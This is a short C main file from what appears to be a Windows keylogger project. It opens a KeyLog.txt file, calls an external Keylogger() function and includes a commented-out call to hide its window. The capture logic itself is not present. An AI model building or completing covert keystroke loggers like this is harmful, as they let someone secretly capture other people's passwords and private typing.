#include "winkey.h"

int main(void)
{
    // HideWindow();

    FILE    *LogFile;
    errno_t err;

    err = fopen_s(&LogFile, "C:\\Users\\Vicente\\Tmp\\KeyLog.txt", "a+");
    printf("Test\n");
    if (err != 0)
        return 1;

    if (Keylogger() == false)
    {
        fclose(LogFile);
        return 1;
    }


    fclose(LogFile);
    
    return 0;
}